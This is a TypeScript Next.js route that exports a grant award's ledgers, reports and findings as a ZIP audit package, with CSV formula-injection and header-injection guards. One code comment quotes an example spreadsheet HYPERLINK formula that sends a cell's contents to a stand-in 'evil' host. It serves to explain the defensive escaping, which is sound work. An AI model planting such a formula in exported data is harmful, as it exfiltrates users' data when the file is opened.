/**
 * GET /api/awards/audit-package?awardId=...
 *
 * Bundles everything an auditor would ask for about an award into a single
 * ZIP archive: budget summary, expense ledger (CSV), match ledger (CSV),
 * drawdowns (CSV), reports (CSV), subrecipients (CSV), compliance brief
 * (JSON), compliance checklists (JSON), audit findings + CAPs (JSON), and a
 * top-level README explaining the contents.
 *
 * Streamed back as application/zip with a Content-Disposition header that
 * names the file by FAIN. The ZIP is built in-memory using jszip — fine for
 * the corvo demo dataset (a couple thousand expenses worst case). For
 * production with very large datasets, this should be migrated to a streaming
 * archiver and uploaded to S3 instead.
 */

import { NextRequest, NextResponse } from "next/server";
import JSZip from "jszip";
import { setTenantConfigFromHeaders, getTenantConfig } from "@/lib/db/tenant-config";
import { prisma } from "@/lib/db/client";
import * as DemoAwards from "@/lib/db/repositories/demo-awards";

export const maxDuration = 60;

function getPortId() {
  return getTenantConfig().portId;
}

// CSV helpers — quoting + formula injection guard.
//
// Excel / Google Sheets / Numbers all interpret a cell whose first char
// is one of `=` `+` `-` `@` `\t` `\r` as a formula. A vendor name like
// `=HYPERLINK("https://evil/?steal="&A1,"click")` would exfiltrate the
// neighboring cell on open. We prepend a single quote to neutralize the
// formula starter, which Excel hides on display but renders cleanly in
// other tools.
const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

function csvField(v: unknown): string {
  if (v === null || v === undefined) return "";
  let s = String(v);
  // Strip nul / control chars that some spreadsheet tools mishandle
  s = s.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F]/g, "");
  if (FORMULA_TRIGGER.test(s)) {
    s = `'${s}`;
  }
  if (s.includes(",") || s.includes('"') || s.includes("\n")) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

function csvLine(fields: unknown[]): string {
  return fields.map(csvField).join(",");
}

function toCSV(headers: string[], rows: unknown[][]): string {
  return [csvLine(headers), ...rows.map(csvLine)].join("\n");
}

// L-1: README field interpolation. The audit-package README is a plain
// text file, but it interpolates user-controlled fields like award.title,
// program, and agency. None of those should ever contain control chars
// or break the file's structure (e.g. embedded NULs that confuse text
// editors). Strip control characters and cap length defensively.
function readmeField(v: unknown, maxLen = 500): string {
  if (v === null || v === undefined) return "";
  let s = String(v);
  s = s.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, "");
  if (s.length > maxLen) s = s.slice(0, maxLen) + "…";
  return s;
}

export async function GET(request: NextRequest) {
  try {
    setTenantConfigFromHeaders(request.headers);
    const awardId = request.nextUrl.searchParams.get("awardId");
    if (!awardId) {
      return NextResponse.json({ error: "awardId is required" }, { status: 400 });
    }

    const portId = getPortId();

    // Fetch the award (with budget categories + match ledger via repo)
    const award = await DemoAwards.getAwardById(awardId);
    if (!award) {
      return NextResponse.json({ error: "Award not found" }, { status: 404 });
    }

    // Pull everything else in parallel
    const [expenses, drawdowns, subrecipients, scheduledReports, checklists, findings] = await Promise.all([
      DemoAwards.getExpensesForAward(awardId),
      DemoAwards.getDrawdownsForAward(awardId),
      prisma.demoSubrecipient.findMany({
        where: { awardId, portId },
        include: { reports: true },
      }),
      prisma.demoScheduledReport.findMany({
        where: { awardId, portId },
        orderBy: { dueDate: "asc" },
      }),
      prisma.demoComplianceChecklist.findMany({
        where: { awardId, portId },
        include: { items: { orderBy: { sortOrder: "asc" } } },
      }),
      prisma.demoAuditFinding.findMany({
        where: { awardId, portId },
        include: { correctiveActions: true },
      }),
    ]);

    const zip = new JSZip();
    const generatedAt = new Date().toISOString();

    // ── README ──
    const totalSpent = expenses
      .filter((e) => e.status !== "flagged")
      .reduce((s, e) => s + e.amount, 0);
    const totalDrawn = drawdowns
      .filter((d) => d.status === "approved" || d.status === "payment_received")
      .reduce((s, d) => s + d.totalAmount, 0);

    const readme = `AUDIT PACKAGE — ${readmeField(award.title, 200)}
Generated: ${generatedAt}

────────────────────────────────────────────────────────────
AWARD SUMMARY
────────────────────────────────────────────────────────────
Title:                ${readmeField(award.title, 200)}
Awarding Agency:      ${readmeField(award.awardingAgency, 200)}
Program:              ${readmeField(award.program, 200)}
FAIN:                 ${readmeField(award.fain, 60)}
CFDA / Listing #:     ${readmeField(award.cfda, 20)}
Total Award Amount:   $${award.totalAmount.toLocaleString()}
Period of Performance: ${readmeField(award.performancePeriod.start, 20)} → ${readmeField(award.performancePeriod.end, 20)}
Match Requirement:    ${award.matchRequirement.percentage}% (${award.matchRequirement.committed.toLocaleString()} committed of ${award.matchRequirement.required.toLocaleString()} required)
Status:               ${readmeField(award.status, 30)}

Total Expenses Logged: $${totalSpent.toLocaleString()} (${expenses.length} entries)
Total Drawn:           $${totalDrawn.toLocaleString()} (${drawdowns.length} requests)

────────────────────────────────────────────────────────────
PACKAGE CONTENTS
────────────────────────────────────────────────────────────
README.txt                  This file
award.json                  Full award record (JSON)
budget.csv                  Budget categories — ceiling, spent, remaining
expenses.csv                Expense ledger — every charge against this award
match-ledger.csv            Cost share / match ledger entries
drawdowns.csv               Drawdown / reimbursement requests
reports.csv                 Scheduled federal reports (SF-425, SF-270, PPR, etc.)
subrecipients.csv           Subrecipient roster + cumulative spend + report status
compliance-brief.json       AI-generated compliance brief (if generated)
compliance-checklists.json  All compliance checklists for this award (Buy America, NEPA, etc.)
audit-findings.json         Prior audit findings + corrective action plans

────────────────────────────────────────────────────────────
CHAIN OF CUSTODY
────────────────────────────────────────────────────────────
This package was generated programmatically from the Corvo reporting
database. All financial figures are derived from the underlying expense and
drawdown ledgers; no manual override or post-export editing has been applied.

For questions, contact the grant administrator.
`;
    zip.file("README.txt", readme);

    // ── award.json ──
    zip.file("award.json", JSON.stringify(award, null, 2));

    // ── budget.csv ──
    const budgetCSV = toCSV(
      ["Category", "Ceiling", "Spent", "Remaining", "% Used"],
      award.budgetCategories.map((c) => [
        c.name,
        c.ceiling,
        c.spent,
        c.ceiling - c.spent,
        c.ceiling > 0 ? `${Math.round((c.spent / c.ceiling) * 100)}%` : "—",
      ])
    );
    zip.file("budget.csv", budgetCSV);

    // ── expenses.csv ──
    const expensesCSV = toCSV(
      ["ID", "Date", "Description", "Vendor", "Amount", "Category ID", "Status", "Flag Reason", "Created At"],
      expenses.map((e) => [
        e.id,
        e.date,
        e.description,
        e.vendor,
        e.amount,
        e.categoryId,
        e.status,
        e.flagReason || "",
        e.createdAt,
      ])
    );
    zip.file("expenses.csv", expensesCSV);

    // ── match-ledger.csv ──
    const matchCSV = toCSV(
      ["Date", "Description", "Type", "Amount", "Documentation"],
      award.matchLedger.map((m) => [m.date, m.description, m.type, m.amount, m.documentation || ""])
    );
    zip.file("match-ledger.csv", matchCSV);

    // ── drawdowns.csv ──
    const drawdownsCSV = toCSV(
      ["ID", "Amount", "Status", "Submitted", "Approved", "Paid", "Notes", "Expense Count", "Created"],
      drawdowns.map((d) => [
        d.id,
        d.totalAmount,
        d.status,
        d.submittedDate || "",
        d.approvedDate || "",
        d.paymentDate || "",
        d.notes,
        d.expenseIds.length,
        d.createdAt,
      ])
    );
    zip.file("drawdowns.csv", drawdownsCSV);

    // ── reports.csv ──
    type ScheduledReportRow = {
      type: string;
      title: string;
      periodStart: Date;
      periodEnd: Date;
      dueDate: Date;
      status: string;
      submittedDate: Date | null;
      notes: string;
    };
    const reportsCSV = toCSV(
      ["Type", "Title", "Period Start", "Period End", "Due Date", "Status", "Submitted Date", "Notes"],
      (scheduledReports as unknown as ScheduledReportRow[]).map((r) => [
        r.type,
        r.title,
        r.periodStart.toISOString().split("T")[0],
        r.periodEnd.toISOString().split("T")[0],
        r.dueDate.toISOString().split("T")[0],
        r.status,
        r.submittedDate ? r.submittedDate.toISOString().split("T")[0] : "",
        r.notes,
      ])
    );
    zip.file("reports.csv", reportsCSV);

    // ── subrecipients.csv ──
    // Inline shape — Prisma's generated type for the include is unwieldy and we
    // only need a narrow projection.
    type SubReport = { status: string; dueDate: Date };
    type SubWithReports = {
      entityName: string;
      classification: string;
      uei: string | null;
      riskLevel: string;
      subawardAmount: { toString(): string } | number;
      cumulativeSpend: { toString(): string } | number;
      reports: SubReport[];
    };
    const subsCSV = toCSV(
      ["Entity Name", "Classification", "UEI", "Risk Level", "Subaward Amount", "Cumulative Spend", "Reports Total", "Reports Overdue"],
      (subrecipients as unknown as SubWithReports[]).map((s) => {
        const overdue = s.reports.filter(
          (r: SubReport) => r.status === "pending" && new Date(r.dueDate) < new Date()
        ).length;
        return [
          s.entityName,
          s.classification,
          s.uei || "",
          s.riskLevel,
          Number(s.subawardAmount),
          Number(s.cumulativeSpend),
          s.reports.length,
          overdue,
        ];
      })
    );
    zip.file("subrecipients.csv", subsCSV);

    // ── compliance-brief.json ──
    if (award.complianceBrief) {
      zip.file("compliance-brief.json", JSON.stringify(award.complianceBrief, null, 2));
    } else {
      zip.file("compliance-brief.json", JSON.stringify({ note: "No compliance brief generated for this award" }, null, 2));
    }

    // ── compliance-checklists.json ──
    zip.file("compliance-checklists.json", JSON.stringify(checklists, null, 2));

    // ── audit-findings.json ──
    zip.file("audit-findings.json", JSON.stringify(findings, null, 2));

    // Generate the ZIP as a Node Buffer (works as BodyInit in Next runtime)
    const blob = await zip.generateAsync({ type: "nodebuffer", compression: "DEFLATE" });

    // L-3: Build a Content-Disposition header that survives a hostile FAIN.
    // Strategy:
    //   1. Strip the FAIN to a conservative ASCII subset (no spaces, no
    //      quotes, no semicolons, no slashes — anything Word/Excel-safe).
    //   2. Cap length so an attacker cannot stuff a 10KB FAIN into the
    //      header.
    //   3. Provide both `filename=` (legacy ASCII) and `filename*=` (RFC
    //      5987 UTF-8) so old clients still get a name; the percent-
    //      encoded variant escapes anything non-ASCII.
    //   4. Both parameters double-quote the value and escape backslashes
    //      so a stray `"` cannot break out of the header parameter.
    const safeFainAscii = award.fain.replace(/[^a-zA-Z0-9._-]/g, "_").slice(0, 64) || "award";
    const dateStamp = generatedAt.split("T")[0];
    const baseFilename = `audit-package-${safeFainAscii}-${dateStamp}.zip`;
    const utf8Filename = encodeURIComponent(baseFilename);

    return new NextResponse(blob as unknown as BodyInit, {
      status: 200,
      headers: {
        "Content-Type": "application/zip",
        "Content-Disposition": `attachment; filename="${baseFilename}"; filename*=UTF-8''${utf8Filename}`,
        "Content-Length": String(blob.length),
      },
    });
  } catch (error) {
    console.error("Audit package error:", error);
    return NextResponse.json(
      {
        error: error instanceof Error ? error.message : "Failed to generate audit package",
      },
      { status: 500 }
    );
  }
}
